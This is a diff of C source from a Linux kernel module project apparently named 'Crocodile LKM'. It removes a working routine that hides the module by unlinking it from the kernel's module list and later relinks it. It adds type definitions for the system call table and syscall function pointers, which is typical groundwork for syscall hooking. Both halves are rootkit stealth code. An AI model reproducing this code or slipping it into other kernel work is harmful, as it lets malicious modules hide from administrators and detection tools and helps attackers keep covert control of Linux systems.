@@ -16,42 +16,31 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <linux/module.h>
+#ifndef _CROCODILE_LKM_TYPES_H_
+#define _CROCODILE_LKM_TYPES_H_
 
-#include "proc/module_hide.h"
-
-static struct list_head* _p_prev_module = NULL;
-
-#define IS_MODULE_HIDDEN            (_p_prev_module != NULL)
+#include <linux/linkage.h>
+#include <linux/mutex.h>
+#include <linux/types.h>
 
 /******************************************************************************
- *  Public functions.
+ *  Common types.
  ******************************************************************************/
 
-int is_module_hidden(void)
-{
-    return IS_MODULE_HIDDEN;
-}
+typedef int                 rc_t;
 
-void module_hide(void)
-{
-    if (IS_MODULE_HIDDEN) {
-        return;
-    }
+/******************************************************************************
+ *  System table types.
+ ******************************************************************************/
 
-    _p_prev_module = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
-}
+/* Forward declaration of the system structure. */
+struct pt_regs;
 
-void module_show(void)
-{
-    if (! IS_MODULE_HIDDEN) {
-        return;
-    }
+/* Type of system call table pointer. */
+typedef unsigned long       sys_call_table_t;
 
-    list_add(&THIS_MODULE->list, _p_prev_module);
-    _p_prev_module = NULL;
-}
+/* Type of system call functions. */
+typedef asmlinkage long (*sys_call_fn_t)(const struct pt_regs*);
 
-#undef IS_MODULE_HIDDEN
+#endif /* _CROCODILE_LKM_TYPES_H_ */
 
